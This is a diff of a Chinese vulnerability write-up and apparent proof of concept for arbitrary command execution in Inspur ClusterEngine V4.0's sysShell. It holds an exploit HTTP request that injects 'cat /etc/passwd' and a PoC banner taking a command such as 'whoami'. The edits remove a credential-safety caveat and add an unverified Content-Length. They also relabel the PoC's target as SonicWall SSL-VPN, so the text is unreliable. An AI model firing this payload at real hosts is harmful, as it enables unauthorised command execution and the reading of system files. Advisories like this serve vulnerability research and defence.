@@ -42,7 +42,7 @@ schema_version: "1"
 
 ## 操作风险
 
-命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。
 
 ## 技术资料与来源记录
 
@@ -82,11 +82,12 @@ Accept-Encoding: gzip, deflate
 Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 Cookie: lang=cn
 Cache-Control: max-age=0
+Content-Length: 42
 
 op=doPlease&node=cu01&command=cat /etc/passwd
 ```
 
-> 请求长度说明：原资料 Content-Length 为 42；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 42；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 
 ![](./.resource/浪潮ClusterEngineV4.0-sysShell-任意命令执行漏洞/media/202202091852805.png)
@@ -118,7 +119,7 @@ from requests.packages.urllib3.exceptions import InsecureRequestWarning
 def title():
     print('+------------------------------------------')
     print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
-    print('+  \033[34mVersion: Inspur ClusterEngine V4.0                                       \033[0m')
+    print('+  \033[34mVersion: SonicWall SSL-VPN                                       \033[0m')
     print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
     print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
     print('+  \033[36mCmd         >>> whoami                                            \033[0m')
